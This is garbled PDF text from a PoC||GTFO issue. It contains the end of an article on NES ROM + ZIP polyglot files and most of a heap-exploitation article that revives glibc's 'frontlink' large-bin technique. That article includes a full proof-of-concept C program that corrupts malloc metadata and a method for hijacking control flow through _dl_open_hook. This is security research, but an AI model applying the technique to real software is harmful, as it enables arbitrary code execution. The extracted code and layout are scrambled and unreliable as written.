Start of a Central Directory File Header
Central Directory File Header
Signature (504B0102)
[0000:0004]
Central Directory Offset [0010:0014]
Comment Length (L) [0014:0016]
ZIP File Comment
[0016:0016 + L]
Figure 9. End of Central Directory Record Format
11 unzip
Local Header Offset [002A:002E]
[002E:]
Figure 10. Central Directory File Header Format
End of Central Directory Record
Signature (504B0506)
[0000:0004]
[0004:0010]
[0004:002A]
...
Start of End of Central Directory Record
... ...
pocorgtfo18.pdf APPNOTE.TXT
19Start of iNES + ZIP Polyglot File
Miscellaneous ZIP File Fun
Five bytes into each Central Directory File Header
is a byte that determines which Host OS the file
attributes are compatible for.
The document, “APPNOTE.TXT - .ZIP File
Format Specification” by PKWARE, Inc., specifies
what Host OS goes with which decimal byte value. 11
I included a list of hex byte values for each Host OS
below.
iNES Header [0000:0010]
PRG ROM [0010:4010]
PRG Padding
ZIP File Data
1 00 − MS −DOS and OS/2
01 − Amiga
3 02 − OpenVMS
03 − UNIX
5 04 − VM/CMS
05 − A t a r i ST
7 06 − OS/2 H. P . F . S .
07 − Macintosh
9 08 − Z−System
09 − CP/M
11 0A − Windows NTFS
0B − MVS (OS/390 − Z/OS)
13 0C − VSE
0D − Acorn R i s c
15 0E − VFAT
0F − A l t e r n a t e MVS
17 10 − BeOS
11 − Tandem
19 12 − OS/400
13 − OS/X ( Darwin )
21 (14−FF) − Unused
[XXxx:YYyy]
[YYyy:400A]
Comment Length (0602) [4008:400A]
PRG Interrupt Vectors [400A:4010]
CHR ROM
[4010:6010]
Figure 11. iNES + ZIP Polyglot File Format
iNES + ZIP File Format
With this information about iNES files and ZIP files,
we can now create an iNES + ZIP polyglot file, as
shown in Figure 11.
Here, the first sixteen bytes of the file continue
to be the same iNES header as before.
The PRG ROM still starts in the same location.
Somewhere in the PRG Padding an amount of bytes
equal to the length of the ZIP file data is replaced
with the ZIP file data. The ZIP file data starts at
hex offset YYyy and ends right before the PRG Inter-
rupt Vectors. This ZIP file data MUST be smaller
than or equal to the size of the PRG Padding to
make this polyglot file.
Local Header Offsets and the Central Directory
Offset of the ZIP file data are updated by adding the
little-endian hex value yyYY to them and the ZIP file
comment length is set to the little-endian hex value
0602 (8,198 in Decimal), which is the length of the
PRG Interrupt Vectors plus the CHR ROM (8 KiB).
PRG Interrupt Vectors and CHR ROM data re-
main unmodified, so they are still the same as be-
fore.
Because the iNES header is the same, the PRG
and CHR ROM are still the correct size, and none
of the required PRG ROM data or any of the CHR
ROM data were modified, this file is still a com-
pletely standard NES ROM. The NES ROM file
does not change in size, so there is no extra “garbage
data” outside of the NES ROM file as far as NES
emulators are concerned.
With the ZIP file offsets being updated and all
Although 0A is specified for Windows NTFS and
0B is specified for MVS (OS/390 - Z/OS), I kept
getting the Host OS value of TOPS-20 when I used
0A and NTFS when I used 0B.
I ended up deciding to set the Host OS for all
of the Central Directory File Headers to Atari ST.
With that said, I have tested every Host OS value
from 00 to FF on this file and it extracted properly
for every value. Different Host OS values may pro-
duce different read, write, and execute values for the
extracted files and directories.
12 The only ZIP file extractor I have gotten any warnings from with this polyglot file was 7-Zip for Windows specifically, with
the warning, “The archive is open with offset.” The polyglot file still extracted properly.
20data after the ZIP file data being declared as a ZIP
file comment, this file is a standard ZIP file that your
ZIP file extractor will be able to properly extract. 12
NES Cartridge
The PRG and CHR ROMs of this polyglot file can
be burned onto EPROMs and put on an NROM-
128 board to make a completely functioning NES
cartridge.
Ripping the NES ROM from the cartridge and
turning it back into an iNES file will result in the file
being a NES + ZIP polyglot file again. It is there-
fore possible to sneak a secret ZIP file to someone
via a working NES cartridge.
Don’t be surprised if that crappy bootleg copy of
Tetris I give you is also a ZIP file containing secret
documents!
Source Code
This NES + ZIP polyglot file is a quine. 13 Unzip
it and the extracted files will be its source code. 14
Compile that source code and you’ll create another
NES + ZIP polyglot file quine that can then be un-
zipped to get its source code.
I was able to make this file contain its own source
code because the source code itself was quite small
and highly compressible in a ZIP file.
13 unzip
14 unzip
pocorgtfo18.pdf neszip-example.nes
neszip-example.nes
2118:05
House of Fun; or,
Heap Exploitation against GlibC in 2018
by Yannay Livneh
GlibC’s malloc implementation is a gift that
keeps on giving. Every now and then someone finds
a way to turn it on its head and execute arbitrary
code. Today is one of those days. Today, dear
neighbor, you will see yet another path to code ex-
ecution. Today you will see how you can overwrite
arbitrary memory addresses—yes, more than one!—
with a pointer to your data. Today you will see
the perfect gadget that will make the code of your
choosing execute. Welcome to the House of Fun.
So, an attacker in control of fd and bk can write the
value of bk to (somewhat after) fd and vice versa.
This is why, in late 2004, a series of patches to
GNU libc malloc implemented over a dozen manda-
tory integrity assertions, effectively rendering the
existing techniques obsolete. If the previous sen-
tence sounds familiar, this is not a coincidence, as it
is a quote from the famous Malloc Maleficarum. 17
This paper was published in 2005 and was imme-
diately regarded as a classic. It described five new
heap exploitation techniques. Some, like previous
techniques, exploited the structure of the heap, but
others introduced a new capability: allocating ar-
bitrary memory. These newer techniques exploited
the fact that malloc is a memory allocator, returning
memory for the caller to use. By corrupting various
fields used by the allocator to decide which memory
to allocate (the chunk’s size and pointers to sub-
sequent chunks), exploiters tricked the allocator to
return addresses in the stack, .got, or other places.
Over time, many more integrity checks were
added to glibc. These checks try to make sure the
size of a chunk makes sense before allocating it to
the user, and that it’s in a reasonable memory re-
gion. It is not perfect, but it helped to some degree.
Then, hackers came up with a new idea. While
allocating memory anywhere in the process’s virtual
space is a very strong primitive, many times it’s suf-
ficient to just corrupt other data on the heap, in
neighboring chunks. By corrupting the size field or
even just the flags in the size field, it’s possible to
corrupt the chunk in such a way that makes the
heap allocate a chunk which overlaps another chunk
with data the exploiter wants to control. A couple
of techniques which demonstrate it were published
in recent years, most notably Chris Evans’ The poi-
soned NUL byte, 2014 edition. 18
To mitigate against these kinds of attacks, an-
other check was added. The size of a freed chunk
is written twice, once in the beginning of the chunk
and again at its end. When the allocator makes
a decision based on the chunk’s size, it verifies that
The History We Were Taught
The very first heap exploitation techniques were
publicly introduced in 2001.
Two papers in
Phrack 57—Vudo Malloc Tricks 15 and Once Upon
a Free 16 —explained how corrupted heap chunks can
lead to full compromise. They presented methods
that abused the linked list structure of the heap
in order to gain some write primitives. The best
known technique introduced in these papers is the
unlink technique, attributed to Solar Designer. It
is quite well known today, but let’s explain how it
works anyway. In a nutshell, deletion of a controlled
node from a linked list leads to a write-what-where
primitive.
Consider this simple implementation of list dele-
tion:
1 void l i s t _ d e l e t e ( node_t ∗ node ) {
node−>fd−>bk = node−>bk ;
3
node−>bk−>f d = node−>f d ;
}
This is roughly equivalent to:
prev =
2 next =
∗ ( next
4 ∗ ( prev
node−>bk ;
node−>f d ;
+ o f f s e t o f ( node_t , bk ) ) = p r e v ;
+ o f f s e t o f ( node_t , f d ) ) = n e x t ;
15 unzip
pocorgtfo18.pdf vudo.txt # Phrack 57:8
pocorgtfo18.pdf onceuponafree.txt # Phrack 57:9
17 unzip pocorgtfo18.pdf MallocMaleficarum.txt
18 https://googleprojectzero.blogspot.com/2014/08/
19 git clone https://github.com/shellphish/how2heap || unzip pocorgtfo18.pdf how2heap.zip
16 unzip
22earlier, an annoying doubt popped into my mind.
The primitive I found in malloc’s code is very much
connected to the old unlink primitive; they are lit-
erally counterparts. How come no one had found
and published it in the early years of heap exploita-
tion? And if someone had, how come neither I nor
any of my colleagues I discussed it with had ever
heard of it?
both sizes agree. This isn’t bulletproof, but it helps.
The most up-to-date repository of currently us-
able techniques is maintained by the Shellphish CTF
team in their how2heap GitHub repository. 19
A Brave New Primitive
Sometimes, in order to take two steps forward we
must first take one step back. Let’s travel back in
time and examine the structure of the heap like they
did in 2001. The heap internally stores chunks in
doubly linked lists. We already discussed list dele-
tion, how it can be used for exploitation, and the
fact it’s been mitigated for many years. But list
deletion (unlinking) is not the only list operation!
There is another operation: insertion.
Consider the following code:
So I sat down and read the early papers, the ones
from 2001 that everyone says contain only obsolete
and mitigated techniques. And then I learned, lo
and behold, it had been found many years ago!
History of the Forgotten Frontlink
void l i s t _ i n s e r t _ a f t e r ( prev , node ) {
2
node−>bk = p r e v ;
node−>f d = prev−>f d ;
4
prev−>fd−>bk = node ;
6
prev−>f d = node ;
}
The list insertion primitive described in the previous
section is in fact none other than the frontlink tech-
nique. This technique is the second one described in
Vudo Malloc Tricks, the very first paper about heap
exploitation from 2001. (Part 3.6.2.)
In the paper, the author says it is “less flexible
and more difficult to implement” in comparison to
the unlink technique. It is far inferior in a world with
no NX bit (DEP), as it writes a value the attacker
does not fully control, whereas the unlink technique
enables the attacker to control the written data (as
long as it’s a writable address). I believe that for
this reason the frontlink method was less popular.
And so, it has almost been completely forgotten.
The line before the last roughly translates to:
1 n e x t = prev−>f d
∗ ( n e x t + o f f s e t ( node_t , bk ) ) = node ;
An attacker in control of prev->fd can write the
inserted node address wherever she desires!
Having this control is quite common in the case
of heap-based corruptions. Using a Use-After-Free
or a Heap-Based-Buffer-Overflow, the attacker com-
monly controls the chunk’s fd (forward pointer).
Note also that the data written is not arbitrary. It’s
an address of the inserted node, a chunk on the heap
which may be allocated back to the user, or might
still be in the user’s control! So this is not only a
write-where primitive, it’s more of a write-pointer-
to-what-where.
Looking at malloc’s code, this primitive can be
quite easily employed. Insertion into lists happens
when a freed chunk is inserted into a large bin. But
more about this later. Before diving into the details
of how to use it, there are some issues we need to
clear first.
When I started writing this paper, after under-
standing the categorization of techniques I described
20
In 2002, malloc was re-written as an adaptation
of Doug Lea’s malloc-2.7.0.c. This re-write refac-
tored the code and removed the frontlink macro,
but basically does the same thing upon list insertion.
From this year onward, there is no way to attribute
the name frontlink with the code the technique is
exploiting.
In 2003, William Robertson, et al., announced a
new system that “detects and prevents all heap over-
flow exploits” by using some kind of cookie-based de-
tection. They also announced it in the security focus
mailing list. 20 One of the more interesting responses
to this announcement was from Stefan Esser, who
described his private mitigation for the same prob-
lem. This solution is what we now know as “safe
unlinking.”
https://www.securityfocus.com/archive/1/346087/30/0/
23Robertson says that it only prevents unlink at-
tacks, to which Esser responds:
from early 2005 with glibc 2.3.5 installed. The code
is presented later in this paper.
In conclusion, the frontlink technique never
gained popularity. There is no way to link the name
frontlink to any existing code, and all relevant pa-
pers claim it’s useless and a waste of time.
However, it works in practice today and on every
machine I checked.
I know that modifying unlink does not
protect against frontlink attacks. But
most heap exploiters do not even know
that there is anything else than unlink.
Following this correspondence, in late 2004, the
safe unlinking mitigation was added to malloc’s
code.
In 2005, the Malloc Maleficarum is published.
Here is the first paragraph from the paper:
Back To Completing Exploitation
At this point you might think this write-pointer-
to-what-where primitive is nice, but there is still a
lot of work to do to get control over a program’s
flow. We need to find a suitable pointer to over-
write, one which points to a struct that contains
function pointers. Then we can trigger this in-
direct function call. Surprisingly, this turns out
to be rather easy. Glibc itself has some pointers
which fit perfectly for this primitive. Among some
other pointers, the most suitable for our needs is
the _dl_open_hook. This hook is used when load-
ing a new library. In this process, if this hook is not
NULL, _dl_open_hook->dlopen_mode() is invoked
which can very much be in the attacker’s control!
As for the requirement of loading a library, fear
not! The allocator itself does it for us when an
integrity check fails. So all an attacker needs to
do is to fail an integrity check after overwriting
_dl_open_hook and enjoy her shell. 23
That’s it for theory. Let’s see how we can make
it happen in the actual implementation!
In late 2001, “Vudo Malloc Tricks” and
“Once Upon A free()” defined the ex-
ploitation of overflowed dynamic mem-
ory chunks on Linux. In late 2004, a
series of patches to GNU libc malloc im-
plemented over a dozen mandatory in-
tegrity assertions, effectively rendering
the existing techniques obsolete.
Every paper that followed it and accounted for
the history of heap exploits has the same narrative.
In Malloc Des-Maleficarum, 21 Blackeng states:
The skills published in the first one of
the articles, showed:
— unlink () method.
— frontlink () method.
. . . these methods were applicable until
the year 2004, when the GLIBC library
was patched so those methods did not
work.
And in Yet Another Free Exploitation Tech-
nique, 22 Huku states:
The Gory Internals of Malloc
First, a short recollection of the allocator’s internals.
GlibC malloc handles it’s freed chunks in bins.
A bin is a linked list of chunks which share some
attributes. There are four types of bins: fast, un-
sorted, small, and large. The large bins contain
freed chunks of a specific size-range, sorted by size.
Putting a chunk in a large bin happens only after
sorting it, extracting it from the unsorted bin and
putting it in the appropriate small or large bin. The
The idea was then adopted by glibc-2.3.5
along with other sanity checks thus ren-
dering the unlink() and frontlink()
techniques useless.
I couldn’t find any evidence that supports these
assertions. On the contrary, I managed to success-
fully employ the frontlink technique on various plat-
forms from different years, including Fedora Core 4
21 unzip
pocorgtfo18.pdf mallocdesmaleficarum.txt # Phrack 66:10
pocorgtfo18.pdf yetanotherfree.txt # Phrack 66:6
23 Another promising pointer is the _IO_list_all pointer, or any pointer to the FILE struct. The implications of overwriting
this pointer are explained in the House of Orange. In recent glibc versions, corruption of FILE vtables has been mitigated to
some extent, therefore it’s harder to use than _dl_open_hook. Ironically, this mitigation uses _dl_open_hook and this is how I
got to play with it in the first place. To read more about _IO_list_all and overwriting FILE vtables, see Angelboy’s excellent
HITCON 2016 CTF qualifier post. To see how to bypass the mitigation, see my own 300 CTF challenge.
unzip pocorgtfo18.pdf 300writeup.md
22 unzip
24The Frontlink Technique in 2018
sorting process happens when a user requests an al-
location which can’t be satisfied by the fast or small
bins. When such a request is made, the allocator it-
erates over the chunks in the unsorted bin and puts
each chunk where it belongs. After sorting the un-
sorted bin, the allocator applies a best-fit algorithm
and tries to find the smallest freed chunk that can
satisfy the user’s request. As a large bin contains
chunks of multiple sizes, every chunk in the bin not
only points to the previous and next chunk (bk and
fd) in the bin but also points to the next and previ-
ous chunks which are smaller and bigger than itself
(bk_nextsize and fd_nextsize). Chunks in a large
bin are sorted by size, and these pointers speed up
the search for the best fit chunk.
Figure 13 illustrates a large bin with seven
chunks of three sizes. Figure 12 contains the rel-
evant code from _int_malloc. 24
Here, the size variable is the size of the victim
chunk which is removed from the unsorted bin. The
logic in lines 3566–3620 tries to determine between
which bck and fwd chunks it should be inserted.
Then, in lines 3622–3626, it is actually inserted into
the list. In the case that the victim chunk belongs in
a small bin, bck and fwd are trivial. As all chunks
in a small bin have the same size, it does not mat-
ter where in the bin it is inserted, so bck is the
head of the bin and fwd is the first chunk in the bin
(lines 3568–3573). However, if the chunk belongs in
a large bin, as there are chunks of various sizes in
the bin, it must be inserted in the right place to keep
the bin sorted.
If the large bin is not empty (line 3581) the code
iterates over the chunks in the bin with a decreasing
size until it finds the first chunk that is not smaller
than the victim chunk (lines 3599–3603). Now, if
this chunk is of a size that already exists in the bin,
there is no need to insert it into the nextsize list, so
just put it after the current chunk (lines 3605–3607).
If, on the other hand, it is of a new size, it needs
to be inserted into the nextsize list (lines 3608–
3614). Either way, eventually set the bck accord-
ingly (line 3615) and continue to the insertion of the
victim chunk into the linked list (lines 3622–3626).
24 All
So, remembering our nice theories, we need to con-
sider how can we manipulate the list insertion to
our needs. How can we control the fwd and bck
pointers?
When the victim chunk belongs in a small bin,
these values are hard to control. The bck is the ad-
dress of the bin, an address in the globals section of
glibc. And the fwd address is a value written in this
section. bck->fd which means it’s a value written
in glibc’s global section. A simple heap vulnera-
bility such as a Use-After-Free or Buffer Overflow
does not let us corrupt this value in any immediate
way, as these vulnerabilities usually corrupt data on
the heap. (A different mapping entirely from glibc.)
The fast bins and unsorted bin are equally unhelp-
ful, as insertion to these bins is always done at the
head of the list.
So our last option to consider is using the large
bins. Here we see that some data from the chunks
is used. The loop which iterates over the chunks
in a large bin uses the fd_nextsize pointer to set
the value of fwd and the value of bck is derived
from this pointer as well. As the chunk pointed by
fwd must meet our size requirement and the bck
pointer is derived from it, we better let it point to
a real chunk in our control and only corrupt the
bk of this chunk. Corrupting the bk means that
line 3626 writes the address of the victim chunk
to a location in our control. Even better, if the
victim chunk is of a new size that does not previ-
ously exist in the bin, lines 3611–3612 insert this
chunk to the nextsize list and write its address to
fwd->bk_nextsize->fd_nextsize. This means we
can write the address of the victim chunk to another
location. Two writes for one corruption!
In summary, if we corrupt a bk and bk_nextsize
of a chunk in the large bin and then cause mal-
loc to insert another chunk with a bigger size,
this will overwrite the addresses we put in bk and
bk_nextsize with the address of the freed chunk.
code glibc code snippets in this paper are from version 2.24.
253504
3505
3506
...
3511
...
3549
3550
3551
3552
3553
3554
3555
3556
...
3561
3562
3563
3564
3565
3566
3567
3568
3569
3570
3571
3572
3573
3574
3575
3576
3577
3578
3579
3580
3581
3582
3583
3584
3585
3586
3587
3588
3589
3590
3591
3592
3593
3594
3595
3596
3597
3598
3599
3600
3601
3602
3603
3604
3605
3606
3607
3608
3609
3610
3611
3612
3613
3614
3615
3616
3617
3618
3619
3620
3621
3622
3623
3624
3625
3626
...
3631
w h i le ( ( v i c t i m = u n s o r t e d _ c h u n k s
{
bck = v i c t i m − >bk ;
s i z e = chunksize
( av )−>bk )
!=
unsorted_chunks
( av ) )
( victim ) ;
/∗ remove from u n s o r t e d l i s t ∗/
u n s o r t e d _ c h u n k s ( av )−>bk = bck ;
bck− >f d = u n s o r t e d _ c h u n k s ( av ) ;
/∗ Take now
if
instead
of
binning
if
exact
fit
∗/
( s i z e == nb )
{
void ∗p = chunk2mem ( v i c t i m ) ;
alloc_perturb (p , bytes ) ;
return p ;
}
/∗ place
if ( in_smallbin_range
chunk
in
bin
∗/
( size ))
{
victim_index = smallbin_index ( s i z e ) ;
bck = b i n _ a t ( av , v i c t i m _ i n d e x ) ;
fwd = bck− >f d ;
}
else
{
victim_index = largebin_index ( s i z e ) ;
bck = b i n _ a t ( av , v i c t i m _ i n d e x ) ;
fwd = bck− >f d ;
/∗ m a i n t a i n l a r g e b i n s i n s o r t e d o r d e r ∗/
i f ( fwd != bck )
{
/∗ Or w i t h i n u s e b i t t o s p e e d c o m p a r i s o n s ∗/
s i z e |= PREV_INUSE ;
/∗ i f s m a l l e r t h a n s m a l l e s t , b y p a s s l o o p b e l o w ∗/
a s s e r t ( ( bck− >bk− >s i z e & NON_MAIN_ARENA) == 0 ) ;
i f ( ( unsigned long ) ( s i z e ) < ( unsigned long ) ( bck− >bk− >s i z e ) )
{
fwd = bck ;
bck = bck− >bk ;
v i c t i m − >f d _ n e x t s i z e = fwd− >f d ;
v i c t i m − >b k _ n e x t s i z e = fwd− >f d − >b k _ n e x t s i z e ;
fwd− >f d − >b k _ n e x t s i z e = v i c t i m − >b k _ n e x t s i z e − >f d _ n e x t s i z e = v i c t i m ;
}
else
{
a s s e r t ( ( fwd− >s i z e & NON_MAIN_ARENA) == 0 ) ;
w h il e ( ( unsigned long ) s i z e < fwd− >s i z e )
{
fwd = fwd− >f d _ n e x t s i z e ;
a s s e r t ( ( fwd− >s i z e & NON_MAIN_ARENA) == 0 ) ;
}
if
( ( unsigned long ) s i z e == ( unsigned long ) fwd− >s i z e )
/∗ Always i n s e r t i n t h e s e c o n d p o s i t i o n .
∗/
fwd = fwd− >f d ;
else
{
v i c t i m − >f d _ n e x t s i z e = fwd ;
v i c t i m − >b k _ n e x t s i z e = fwd− >b k _ n e x t s i z e ;
fwd− >b k _ n e x t s i z e = v i c t i m ;
v i c t i m − >b k _ n e x t s i z e − >f d _ n e x t s i z e = v i c t i m ;
}
bck = fwd− >bk ;
}
}
else
v i c t i m − >f d _ n e x t s i z e = v i c t i m − >b k _ n e x t s i z e = v i c t i m ;
}
mark_bin ( av , v i c t i m _ i n d e x ) ;
v i c t i m − >bk = bck ;
v i c t i m − >f d = fwd ;
fwd− >bk = v i c t i m ;
bck− >f d = v i c t i m ;
}
Figure 12. Extract of _int_malloc.
2627
Large
−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−+
|
−−−−−−−−−−+
+
−−−+
−−−−−−−−−−−−−+
−−−−−−−−−−−−−+
−−−−−−−−−−−−−+
−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−+
−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−+
−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−+
−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−+The Frontlink Technique in 2001
written with the address of the chunk P
(at line 5).
For the sake of historical justice, the following is the
explanation of the frontlink technique concept from
Vudo Malloc Tricks. 25
This is the code of list insertion in the old im-
plementation:
Bear in mind the implementation was somewhat
different. The P referred to is the equivalent to
our victim pointer and there was no secondary
nextsize list.
#define f r o n t l i n k ( A, P , S , IDX , BK, FD ) {\
i f ( S < MAX_SMALLBIN_SIZE ) {
\
IDX = s m a l l b i n _ i n d e x ( S ) ;
\
mark_binblock ( A, IDX ) ;
\
BK = bin_at ( A, IDX ) ;
\
FD = BK −>f d ;
\
P−>bk = BK;
\
P−>f d = FD;
\
FD −>bk = BK −>f d = P ;
\
[ 1 ] } else {
\
IDX = bin_index ( S ) ;
\
BK = bin_at ( A, IDX ) ;
\
FD = BK −>f d ;
\
i f ( FD == BK ) {
\
mark_binblock (A, IDX) ;
\
} else {
\
[2]
while (FD != BK
\
&& S < c h u n k s i z e (FD) ) { \
[3]
FD = FD −>f d ;
\
}
\
[4]
BK = FD −>bk ;
\
}
\
P−>bk = BK;
\
P−>f d = FD;
\
[5]
FD −>bk = BK −>f d = P ;
\
}
\
}
The Universal Frontlink PoC
In theory we see both editions are the very same
technique, and it seems what was working in 2001
is still working in 2018. It means we can write one
PoC for all versions of glibc that were ever released!
Please, dear neighbor, compile the code in Fig-
ure 14 and execute it on any machine with any ver-
sion of glilbc and see if it works. I have tried it
on Fedora Core 4 32-bit with glibc-2.3.5, Fedora 10
32-bit live, Fedora 11 32-bit and Ubuntu 16.04 and
17.10 64-bit. It worked on all of them.
We already covered the background of how the
overwrite happens, now we have just a few small
details to cover in order to understand this PoC in
full.
Chunks within malloc are managed in a struct
called malloc_chunk which I copied to the PoC.
When allocating a chunk to the user, malloc uses
only the size field and therefore the first byte the
user can use coincides with the fd field. To get
the pointer to the malloc_chunk, we use mem2chunk
which subtracts the offset of the fd field in the
malloc_chunk struct from the allocated pointer
(also copied from glibc).
The prev_size of a chunk resides in the last
sizeof(size_t) bytes of the previous chunk. It
may only be accessed if the previous chunk is not
allocated. But if it is allocated, the user may write
whatever she wants there. The PoC writes the string
“YES” to this exact place.
Another small detail is the allocation of
ALLOCATION_BIG sizes. These allocations have two
roles: First they make sure that the chunks are not
coalesced (merged) and thus keep their sizes even
when freed, but they also force the allocator to sort
the unsorted bin when there is no free chunk ready
to server the request in a normal bin.
Now, the crux of the exploit is exactly as in the-
ory. Allocate two large chunks, p1 and p2. Free and
corrupt p2, which is in the large-bin. Then free and
insert p1 into the bin. This insertion overwrites the
And this is the description:
If the free chunk P processed by
frontlink() is not a small chunk, the
code at line 1 is executed, and the proper
doubly-linked list of free chunks is tra-
versed (at line 2) until the place where
P should be inserted is found. If the
attacker managed to overwrite the for-
ward pointer of one of the traversed
chunks (read at line 3) with the ad-
dress of a carefully crafted fake chunk,
they could trick frontlink() into leav-
ing the loop (2) while FD points to this
fake chunk. Next the back pointer BK
of that fake chunk would be read (at
line 4) and the integer located at BK plus
8 bytes (8 is the offset of the fd field
within a boundary tag) would be over-
25 unzip
26 Note
pocorgtfo18.pdf vudo.txt # Phrack 57:8
that the loop in the beginning of the PoC main fills the per-thread caching mechanism introduced in GlibC version 2.26
281 #i n c l u d e
#i n c l u d e
3 #i n c l u d e
#i n c l u d e
5 #i n c l u d e
< s t d i o . h>
< s t d l i b . h>
< a s s e r t . h>
< s t r i n g . h>
< s t d d e f . h>
/∗ C o p i ed from g l i b c −2.24 m a l l o c / m a l l o c . c ∗/
#i f n d e f INTERNAL_SIZE_T
9 #d e f i n e INTERNAL_SIZE_T s i z e _ t
#e n d i f
11
/∗ The c o r r e s p o n d i n g word s i z e ∗/
13 #d e f i n e SIZE_SZ
( s i z e o f (INTERNAL_SIZE_T) )
7
15
17
s t r u c t malloc_chunk {
INTERNAL_SIZE_T
INTERNAL_SIZE_T
19
struct
struct
prev_size ;
size ;
malloc_chunk ∗ f d ;
m a l l o c _ c h u n k ∗ bk ;
/∗
/∗ Size
Size
of
in
/∗ double
p r e v i o u s chunk ( i f f r e e ) .
bytes , i n c l u d i n g overhead .
l i n k s −− u s e d
only
if
free .
∗/
∗/
∗/
21
/∗ Only u s e d f o r l a r g e b l o c k s : p o i n t e r t o n e x t l a r g e r s i z e .
∗/
s t r u c t m a l l o c _ c h u n k ∗ f d _ n e x t s i z e ; /∗ d o u b l e l i n k s −− u s e d o n l y i f
s t r u c t malloc_chunk ∗ b k _ n e x t s i z e ;
23
25
};
typedef
struct
free .
∗/
m a l l o c _ c h u n k ∗ mchunkptr ;
27
/∗ The s m a l l e s t p o s s i b l e chunk ∗/
29 #d e f i n e MIN_CHUNK_SIZE
( o f f s e t o f ( s t r u c t malloc_chunk , f d _ n e x t s i z e ) )
#d e f i n e mem2chunk (mem) ( ( mchunkptr ) ( ( char ∗ ) (mem) − 2∗SIZE_SZ ) )
31 /∗ End o f m a l l o c . c d e c l e r a t i o n s ∗/
33 #d e f i n e ALLOCATION_BIG
35
int
37
( 0 x800 − s i z e o f ( s i z e _ t ) )
main ( i n t a r g c , char ∗∗ a r g v )
char ∗YES = "YES" ;
char ∗NO = "NOPE" ;
int i ;
{
39
// f i l l t h e t c a c h e − i n t r o d u c e d i n g l i b c 2 . 2 6
f o r ( i = 0 ; i < 6 4 ; i ++) {
void ∗tmp = m a l l o c (MIN_CHUNK_SIZE + s i z e o f ( s i z e _ t ) ∗ ( 1 + 2∗ i ) ) ;
m a l l o c (ALLOCATION_BIG) ;
f r e e ( tmp ) ;
m a l l o c (ALLOCATION_BIG) ;
}
41
43
45
47
char ∗ v e r d i c t = NO;
p r i n t f ( " Should f r o n t l i n k
49
51
work ? %s \ n " ,
verdict ) ;
// Make a s m a l l a l l o c a t i o n and p u t t h e s t r i n g "YES" i n i t ’ s end
char ∗ p0 = m a l l o c (ALLOCATION_BIG) ;
a s s e r t ( s t r l e n (YES) < s i z e o f ( s i z e _ t ) ) ; // t h i s i s n o t an o v e r f l o w
memcpy ( p0 + ALLOCATION_BIG − s i z e o f ( s i z e _ t ) , YES , 1 + s t r l e n (YES) ) ;
53
55
// Make two a l l o c a t i o n s r i g h t
void ∗∗ p1 = m a l l o c ( 0 x720 −8) ;
m a l l o c (ALLOCATION_BIG) ;
void ∗∗ p2 = m a l l o c ( 0 x710 −8) ;
m a l l o c (ALLOCATION_BIG) ;
57
59
after
it
and
allocate
a
small
chunk
in
between
to
separate
61
// f r e e t h i r d a l l o c a t i o n
f r e e ( p2 ) ;
m a l l o c (ALLOCATION_BIG) ;
63
and
sort
it
into
a
large
bin
65
/∗ V u n l e r a b l i l i t y ! o v e r w r i t e b k o f p2 s u c h t h a t s t r c o i n c i d e s w i t h t h e
// p2 [ 1 ] = ( ( v o i d ∗ )&v e r d i c t ) − 2∗ s i z e o f ( s i z e _ t ) ;
mem2chunk ( p2 )−>bk = ( ( void ∗ )&v e r d i c t ) − o f f s e t o f ( s t r u c t malloc_chunk ,
/∗ b a c k t o normal b e h a v i o u r ∗/
67
69
71
// f r e e t h e s e c o n d a l l o c a t i o n and
// t h i s w i l l o v e r w r i t e s t r w i t h a
f r e e ( p1 ) ;
m a l l o c (ALLOCATION_BIG) ;
73
sort i t
pointer
to
the
end
of
pointed
fd ) ;
p0 − where we p u t
75
// c h e c k i f i t worked
p r i n t f ( " Does f r o n t l i n k
return 0 ;
77
79
work ? %s \ n " ,
verdict ) ;
}
Figure 14. Universal Frontlink PoC
29
"YES"
chunk ’ s
fd
∗/function calls a static init function which tries to
dlopen libgcc_s.so.1.
So if we manage to fail an integrity check, we can
trigger dlopen which in turn will use data pointed
by _dl_open_hook to change the programs flow.
Win!
verdict pointer with mem2chunk(p1), which points
to the last sizeof(size_t) bytes of p0. 26
Control PC or GTFO
Now that we have frontlink covered, and we know
how to overwrite a pointer to data in our control,
it’s time to control the flow. The best victim to
overwrite is _dl_open_hook. This pointer in glibc,
when not NULL, is used to alter the behavior of
dlopen, dlsym, and dlclose. If set, an invocation
of any of these functions will use a callback in the
struct dl_open_hook pointed by _dl_open_hook.
It’s a very simple structure.
1 struct dl_open_hook {
void ∗ ( ∗ dlopen_mode ) ( const char ∗name ,
3
i n t mode ) ;
void ∗ ( ∗ dlsym ) ( void ∗map ,
5
const char ∗name ) ;
i n t ( ∗ d l c l o s e ) ( void ∗map) ;
7 };
When invoking dlopen, it actually calls
dlopen_mode which has the following implementa-
tion:
1 i f ( _ _ g l i b c _ u n l i k e l y ( _dl_open_hook!=NULL) )
return _dl_open_hook
3
−>dlopen_mode ( name , mode ) ;
Thus, controlling the data pointed to by
_dl_open_hook and being able to trigger a call to
dlopen is sufficient for hijacking a program’s flow.
Now, it’s time for some magic. dlopen is not a
very common function to use. Most binaries know
at compile time which libraries they are going to
use, or at least in program initialization process and
don’t use dlopen during the programs normal oper-
ation. So causing a dlopen invocation may be far
fetched in many circumstances. Fortunately, we are
in a very specific scenario here: a heap corruption.
By default, when the heap code fails an integrity
check, it uses malloc_printerr to print the error
to the user using __libc_message. This happens
after printing the error and before calling abort,
printing a backtrace and memory maps. The func-
tion generating the backtrace and memory maps is
backtrace_and_maps which calls the architecture-
specific function __backtrace. On x86_64, this
Madness? Exploit 300!
Now that we know everything there is to know, it’s
time to use this technique in the real world. For
PoC purposes, we solve the 300 CTF challenge from
the last Chaos Communication Congress, 34c3.
Here is the source code of the challenge, cour-
tesy of its challenge author, Stephen Röttger,
a.k.a. Tsuro:
1 #include <u n i s t d . h>
#include < s t r i n g . h>
3 #include <e r r . h>
#include < s t d l i b . h>
5
#define ALLOC_CNT 10
7
